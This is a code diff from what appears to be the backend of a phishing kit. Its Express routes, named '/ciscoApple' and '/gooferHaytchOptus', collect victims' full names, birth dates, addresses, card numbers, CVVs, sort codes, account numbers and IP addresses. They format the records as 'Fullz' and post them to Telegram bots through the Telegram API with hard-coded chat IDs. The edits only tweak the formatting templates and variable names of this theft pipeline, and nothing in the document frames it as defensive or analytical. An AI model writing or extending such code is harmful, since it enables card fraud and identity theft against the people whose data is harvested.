@@ -4200,9 +4200,7 @@ app.post("/ciscoApple", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+ -------------Fullz--------------+\n\n-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${firstName} ${lastName}\n|DOB: ${dob}\n|Address: ${addy1}, ${addy2}\n|City: ${town}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Holder: ${ccname}\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexpmonth}/${ccexpyear}\n|CVV: ${cvv}\n|Sort Code: ${scode}\n|Account Number: ${accno}\n|Bin: ${bin}\n-------------------------------------------------------------------------\nDevice Information\n|IP Address: ${userIp}\n|UserAgent: ${userAgent}\n---------------  --------------------------------`;
-
-      var originalTextHaytch = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalTextHaytch = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (ciscoCount == 12) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalTextHaytch}`
@@ -6424,7 +6422,7 @@ app.post("/gooferHaytchOptus", (req, res) => {
         .post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
           {
-            chat_id: '-731784056',
+            chat_id: "-731784056",
             text: `Optus:\n${originalText}`,
             parse_mode: "Markdown",
           }
